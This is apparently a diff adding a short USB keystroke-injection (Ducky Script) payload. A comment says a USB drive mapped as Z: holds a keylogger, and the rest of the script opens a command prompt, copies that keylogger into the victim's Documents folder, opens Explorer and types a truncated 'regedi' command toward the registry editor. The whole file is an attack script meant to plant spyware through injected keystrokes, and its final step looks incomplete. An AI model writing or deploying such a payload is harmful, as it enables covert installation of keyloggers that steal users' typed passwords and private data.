@@ -1,0 +1,20 @@
+REM: You need a auxiliary usb drive to get changed to a z drive and have a the keylogger inside it
+DELAY 3500
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1350
+STRING copy Z:\keylogger Documents
+DELAY 1500
+STRING exit
+ENTER
+DELAY 1250
+GUI e
+DELAY 2000
+STRING docum
+ENTER
+DELAY 1000
+STRING regedi
+ENTER
+ALT F4
